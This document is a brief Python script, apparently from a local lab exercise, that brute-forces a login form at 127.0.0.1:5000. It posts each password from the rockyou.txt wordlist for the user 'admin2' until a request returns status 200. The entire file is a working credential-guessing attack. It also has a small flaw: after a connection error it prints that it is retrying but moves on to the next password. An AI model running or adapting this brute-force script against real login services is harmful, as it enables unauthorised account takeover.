import os
import requests
import time

url = "http://127.0.0.1:5000"
session = requests.Session()
current_iteration = 0

# change work dir to script dir
os.chdir(os.path.dirname(os.path.abspath(__file__)))

for line in open( "rockyou.txt", "r"):
    password = line.strip()
    print(password)

    try:
        response = session.post(url, data={"username": "admin2", "password": password})
    except requests.exceptions.ConnectionError:
        time.sleep(0.05)
        print("Request failed, retrying")
        continue

    if response.status_code == 200:
        print(response.text)
        print("password: " + password)
        break